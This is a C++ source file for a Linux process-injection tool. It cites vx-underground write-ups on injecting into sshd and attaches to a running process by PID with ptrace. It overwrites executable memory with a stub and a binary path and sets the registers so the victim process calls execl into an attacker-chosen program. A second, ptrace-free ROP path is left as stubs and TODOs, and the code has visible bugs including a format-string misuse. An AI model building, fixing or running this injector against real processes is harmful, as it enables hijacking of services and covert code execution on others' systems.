// this is a simple program image loader based off:
// with ptrace:
// https://papers.vx-underground.org/papers/VXUG/Mirrors/Injection/linux/blog.xpnsec.com-Linux%20ptrace%20introduction%20AKA%20injecting%20into%20sshd%20for%20fun.pdf
// https://github.com/gaffe23/linux-inject/blob/master/utils.c
//
// without ptrace:
// https://github.com/AonCyberLabs/Cexigua
// https://papers.vx-underground.org/papers/VXUG/Mirrors/Injection/linux/blog.gdssecurity.com-Linux%20based%20inter-process%20code%20injection%20withoutnbspptrace2.pdf
//
// usage: ./inject TARGET_PID TARGET_BINARY ?--ptraceless
//
// -- null333 (seroh#2009) --
//
// TODO: add option for custom libc.so or auto detection
// TODO: move argument checking to main instead of in helpers
//



#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
#include <utility>
#include <vector>
#include <iostream>

#define EXECL_OFF 0xE6680



class ropchain {
    public:
        std::vector<std::pair<void *, size_t>> chain_v;
        void push(void *gadget, size_t len) {
            // TODO: ensure alignment
            chain_v.push_back(std::make_pair(gadget, len));
        }
};

uintptr_t get_free_addr(pid_t pid) {
    // return addr of first chunk with x perms
    char fname[30];
    sprintf(fname, "/proc/%li/maps", (long) pid);
    FILE *fp = fopen(fname, "r");
    char chunk[850]; // ex: 5646750f1000-564675135000 r-xp
    uintptr_t free_addr;
    char is_exec;
    while (fgets(chunk, 850, fp)) {
        sscanf(chunk, "%lx-%*lx %*c%*c%c%*c %*d", &free_addr, &is_exec);
        if (is_exec == 'x') {
            break;
        }
    }
    fclose(fp);
    return free_addr;
}

uintptr_t get_libc_base(pid_t pid) {
    // return libc base addr
    char fname[30];
    sprintf(fname, "/proc/%li/maps", (long) pid);
    FILE *fp = fopen(fname, "r");
    char chunk[850];
    uintptr_t libc_base;
    while (fgets(chunk, 850, fp)) {
        sscanf(chunk, "%lx-%*lx %*c%*c%*c %*d", &libc_base);
        if (strstr(chunk, "libc-2.31.so")) {
            break;
        }
    }
    fclose(fp);
    return libc_base;
}

void ptrace_mem_write(pid_t pid, uintptr_t dest, void *data, size_t len) {
    long curr = 0;
    for (int i = 0; i < len; i += sizeof(long)) {
        if (data) {
            memcpy(&curr, data + i, sizeof(long));
        }
        else {
            curr = 0;
        }
        ptrace(PTRACE_POKETEXT, pid, dest + i, curr);
        curr = 0;
    }
}

void ptrace_write_ropchain(pid_t pid, uintptr_t dest, ropchain chain) {
    uintptr_t off = 0;
    for (std::pair<void *, size_t> &gadget: chain.chain_v) {
        ptrace_mem_write(pid, dest + off, gadget.first, gadget.second);
        off +=  gadget.second;
    }
}

uintptr_t get_stack_ret_addr(pid_t pid) {

}

void procmem_write(pid_t pid, uintptr_t dest, void *data, size_t len) {

}

void procmem_write_ropchain(pid_t pid, uintptr_t dest, ropchain chain) {

}

// TODO: find some way to get this as an object dynamically without a JIT
void shellcode_ptrace() {
    asm("call *%rax \n");
}
void shellcode_ptrace_end() {

}

void shellcode_procmem() {
    asm("call *%rax \n");
}
void shellcode_procmem_end() {

}

int main(int argc, char *argv[]) {
    bool use_ptrace = true;
    if (!(argc == 3 || argc == 4)) {
        std::cout << "invalid number of arguments\n";
        exit(-1);
    }

    if (argc == 4) {
        if (strcmp(argv[3], "--ptraceless") == 0) {
            use_ptrace = false;
        }
        else {
            std::cout << "invalid flag\n";
            exit(-1);
        }
    }

    pid_t target_pid = (pid_t) atoi(argv[1]);
    char *target_binary = argv[2];
    {
        char fname[strlen(target_binary) + 1]; // note: vulnerable to very large target bin names
        sprintf(fname, "/proc/%li/status", (long) target_pid);
        FILE *fp = fopen(fname, "r");

        if (!fp) {
            std::cout << "pid doesnt exist\n";
            exit(-1);
        }
        fclose(fp);

        memset(fname, 0, 30);
        sprintf(fname, target_binary);
        fp = fopen(fname, "r");
        if (!fp) {
            std::cout << "program image doesnt exist\n";
            exit(-1);
        }
        fclose(fp);
    }

    // parse /proc/pid/maps to get needed addrs
    uintptr_t execl_addr = get_libc_base(target_pid) + EXECL_OFF;
    uintptr_t rop_chain_addr = get_free_addr(target_pid);

    if (use_ptrace) {
        // inject shellcode with setregs and write path to target binary to target procs mem

        uintptr_t shellcode_ptrace_size = (uintptr_t) shellcode_ptrace_end - (uintptr_t) shellcode_ptrace;

        // injected register state:
        // eip: execl address
        // rdi: addr of path
        // rsi: NULL (0)
        // rdx: NULL (0)
        struct user_regs_struct regs;
        regs.rip = rop_chain_addr;
        regs.rax = execl_addr;
        regs.rdi = rop_chain_addr + shellcode_ptrace_size;
        regs.rsi = 0;
        regs.rdx = 0;

        ropchain chain;
        chain.push(shellcode_ptrace, shellcode_ptrace_size);
        chain.push(target_binary, strlen(target_binary));

        ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
        waitpid(target_pid, NULL, 0);

        ptrace_write_ropchain(target_pid, rop_chain_addr, chain);

        ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 0;
    }
    else {
        // send pause signal

        // get stack ret addr and write needed variables after ret
        uintptr_t stack_ret_addr = get_stack_ret_addr(target_pid);
        procmem_write(target_pid, stack_ret_addr, rop_chain_addr, sizeof(rop_chain_addr));

        // write rop chain to exec mapped section
        // note: need to use lambda to write this bullshit
        // rop chain
        // - target_bin
        // - mov &target_bin, %rdi
        // - mov 0, %rsi
        // - mov 0, %rdx
        // - call execl_addr
        ropchain chain;
        // chain.push();
        procmem_write_ropchain(target_pid, rop_chain_addr, chain);

        // overwrite stack addr with address of rop chain

        // cont

        return 0;
    }
}
